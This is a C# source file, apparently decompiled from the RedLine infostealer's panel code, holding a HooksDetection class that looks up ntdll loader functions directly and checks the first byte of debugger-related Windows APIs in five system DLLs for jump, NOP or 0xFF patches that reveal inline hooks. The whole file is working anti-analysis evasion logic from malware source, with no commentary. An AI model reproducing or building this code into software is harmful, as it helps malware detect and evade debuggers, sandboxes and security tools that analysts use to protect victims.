using System;
using System.Runtime.InteropServices;

namespace RedLine.MainPanel.Data.Core;

internal class HooksDetection
{
	[DllImport("ntdll.dll", CharSet = CharSet.Unicode, SetLastError = true)]
	private static extern void RtlInitUnicodeString(out Structs.UNICODE_STRING DestinationString, string SourceString);

	[DllImport("ntdll.dll", CharSet = CharSet.Ansi, SetLastError = true)]
	private static extern void RtlUnicodeStringToAnsiString(out Structs.ANSI_STRING DestinationString, Structs.UNICODE_STRING UnicodeString, bool AllocateDestinationString);

	[DllImport("ntdll.dll", SetLastError = true)]
	private static extern uint LdrGetDllHandle([MarshalAs(UnmanagedType.LPWStr)] string DllPath, [MarshalAs(UnmanagedType.LPWStr)] string DllCharacteristics, Structs.UNICODE_STRING LibraryName, ref IntPtr DllHandle);

	[DllImport("ntdll.dll", CharSet = CharSet.Ansi, SetLastError = true)]
	private static extern uint LdrGetProcedureAddress(IntPtr Module, Structs.ANSI_STRING ProcedureName, ushort ProcedureNumber, out IntPtr FunctionHandle);

	private static IntPtr smethod_0(object Library)
	{
		IntPtr DllHandle = IntPtr.Zero;
		Structs.UNICODE_STRING DestinationString = default(Structs.UNICODE_STRING);
		RtlInitUnicodeString(out DestinationString, (string)Library);
		LdrGetDllHandle(null, null, DestinationString, ref DllHandle);
		return DllHandle;
	}

	private static IntPtr smethod_1(IntPtr hModule, object Function)
	{
		IntPtr FunctionHandle = IntPtr.Zero;
		Structs.UNICODE_STRING DestinationString = default(Structs.UNICODE_STRING);
		Structs.ANSI_STRING DestinationString2 = default(Structs.ANSI_STRING);
		RtlInitUnicodeString(out DestinationString, (string)Function);
		RtlUnicodeStringToAnsiString(out DestinationString2, DestinationString, AllocateDestinationString: true);
		LdrGetProcedureAddress(hModule, DestinationString2, 0, out FunctionHandle);
		return FunctionHandle;
	}

	public static bool DetectBadInstructionsOnCommonAntiDebuggingFunctions()
	{
		try
		{
			string[] array = new string[5] { "kernel32.dll", "kernelbase.dll", "ntdll.dll", "user32.dll", "win32u.dll" };
			string[] array2 = new string[7] { "IsDebuggerPresent", "CheckRemoteDebuggerPresent", "GetThreadContext", "CloseHandle", "OutputDebugStringA", "GetTickCount", "SetHandleInformation" };
			string[] array3 = new string[5] { "NtQueryInformationProcess", "NtSetInformationThread", "NtClose", "NtGetContextThread", "NtQuerySystemInformation" };
			string[] array4 = new string[8] { "FindWindowW", "FindWindowA", "FindWindowExW", "FindWindowExA", "GetForegroundWindow", "GetWindowTextLengthA", "GetWindowTextA", "BlockInput" };
			string[] array5 = new string[4] { "NtUserBlockInput", "NtUserFindWindowEx", "NtUserQueryWindow", "NtUserGetForegroundWindow" };
			string[] array6 = array;
			foreach (string text in array6)
			{
				IntPtr intPtr = smethod_0(text);
				if (!(intPtr != IntPtr.Zero))
				{
					continue;
				}
				switch (text)
				{
				case "win32u.dll":
					try
					{
						string[] array7 = array5;
						foreach (string function5 in array7)
						{
							IntPtr source5 = smethod_1(intPtr, function5);
							byte[] array12 = new byte[1];
							Marshal.Copy(source5, array12, 0, 1);
							if (array12[0] == byte.MaxValue || array12[0] == 144 || array12[0] == 233)
							{
								return true;
							}
						}
					}
					catch
					{
					}
					break;
				case "user32.dll":
					try
					{
						string[] array7 = array4;
						foreach (string function4 in array7)
						{
							IntPtr source4 = smethod_1(intPtr, function4);
							byte[] array11 = new byte[1];
							Marshal.Copy(source4, array11, 0, 1);
							if (array11[0] == 144 || array11[0] == 233)
							{
								return true;
							}
						}
					}
					catch
					{
					}
					break;
				case "ntdll.dll":
					try
					{
						string[] array7 = array3;
						foreach (string function3 in array7)
						{
							IntPtr source3 = smethod_1(intPtr, function3);
							byte[] array10 = new byte[1];
							Marshal.Copy(source3, array10, 0, 1);
							if (array10[0] == byte.MaxValue || array10[0] == 144 || array10[0] == 233)
							{
								return true;
							}
						}
					}
					catch
					{
					}
					break;
				case "kernelbase.dll":
					try
					{
						string[] array7 = array2;
						foreach (string function2 in array7)
						{
							IntPtr source2 = smethod_1(intPtr, function2);
							byte[] array9 = new byte[1];
							Marshal.Copy(source2, array9, 0, 1);
							if (array9[0] == byte.MaxValue || array9[0] == 144 || array9[0] == 233)
							{
								return true;
							}
						}
					}
					catch
					{
					}
					break;
				case "kernel32.dll":
					try
					{
						string[] array7 = array2;
						foreach (string function in array7)
						{
							IntPtr source = smethod_1(intPtr, function);
							byte[] array8 = new byte[1];
							Marshal.Copy(source, array8, 0, 1);
							if (array8[0] == 144 || array8[0] == 233)
							{
								return true;
							}
						}
					}
					catch
					{
					}
					break;
				}
			}
		}
		catch
		{
			return false;
		}
		return false;
	}
}
